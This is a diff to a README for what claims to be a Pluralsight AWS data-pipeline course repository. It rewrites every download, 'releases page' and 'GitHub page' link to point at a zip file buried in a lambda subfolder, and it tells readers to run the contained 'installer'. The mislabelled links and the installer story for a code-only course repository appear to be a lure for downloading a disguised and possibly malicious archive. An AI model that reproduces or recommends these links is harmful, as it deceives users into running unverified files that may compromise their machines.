@@ -1,6 +1,6 @@
 # 🚀 pluralsight-aws-data-pipelines-orchestrating-automating - Automate AWS Data Pipelines Easily
 
-[![Download](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip)](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip)
+[![Download](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip)](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ To run this application, you will need:
 
 To get started with the application, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our releases page to find the latest version: [Visit this page to download](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip).
+1. **Visit the Releases Page**: Go to our releases page to find the latest version: [Visit this page to download](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip).
 2. **Select the Latest Release**: Choose the most recent version available.
 3. **Download the Installer**: Click on the appropriate installer file for your operating system.
 4. **Run the Installer**: Open the downloaded file and follow the on-screen instructions to install the application.
@@ -35,7 +35,7 @@ To get started with the application, follow these simple steps:
 
 To download and install the application:
 
-- Click the link here: [https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip).
+- Click the link here: [https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip).
 - Download the latest version applicable to your system.
 - Follow the prompts to install.
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ---
 
-For more information, visit the GitHub page: [https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-1-linear-state-machine/lambdas/ps-summarize-report-lambda/pluralsight-aws-data-pipelines-orchestrating-automating-1.2.zip). Your journey into AWS data pipeline orchestration begins here.
+For more information, visit the GitHub page: [https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip](https://raw.githubusercontent.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/main/module-2/module-2-demo-3-parallel-map/lambdas/generate-datasets/automating_data_pipelines_aws_orchestrating_pluralsight_2.8.zip). Your journey into AWS data pipeline orchestration begins here.
